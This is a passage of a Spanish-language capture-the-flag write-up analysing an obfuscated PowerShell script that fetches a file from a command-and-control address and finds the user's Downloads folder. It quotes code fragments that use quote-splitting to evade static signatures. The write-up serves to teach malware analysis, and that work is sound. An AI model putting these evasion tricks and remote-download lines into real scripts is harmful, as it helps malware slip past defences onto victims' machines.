# Obfuscated Script

## Detalles del Reto
| Atributo | Detalle |
| :--- | :--- |
| **Categoría** | Reverse Engineering / Forensics |
| **Puntos** | 252 puntos |
| **Autor** | Viet Huy Nguyen |

---

## Descripción
> A staff member found two strange files in their Downloads folder: a script and a file they couldn't read. Can you figure out what they are?

### Archivos Provistos
* **[`obfuscated.ps1`](./obfuscated.ps1)**: Un script de PowerShell con variables confusas y código ofuscado.
* **[`encrypted_flag.txt`](./encrypted_flag.txt)**: Un archivo con caracteres ilegibles descargado por el script.

---

## Análisis del Script (`obfuscated.ps1`)

Al realizar la lectura del script de PowerShell, a pesar de tener nombres de variables aleatorios (hashes MD5) y técnicas de evasión de firmas estáticas (como la concatenación de comandos de tipo `In''vok''e-Web""Requ""est`), se pueden identificar tres fases de ejecución:

### 1. Reconocimiento y Descarga
El script define una URL remota de un servidor de Comando y Control (C2) y localiza de forma dinámica la ruta de la carpeta de descargas del usuario utilizando objetos COM del sistema:

```powershell
$09c5b699434943b6b9a9ada620495bcb = "[http://192.168.126.148:8000/encrypted_flag.txt](http://192.168.126.148:8000/encrypted_flag.txt)"
$5a7e4a282bb7448fb7b5bfa39a35b0df = (Ne''w-Ob""jec''t -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path
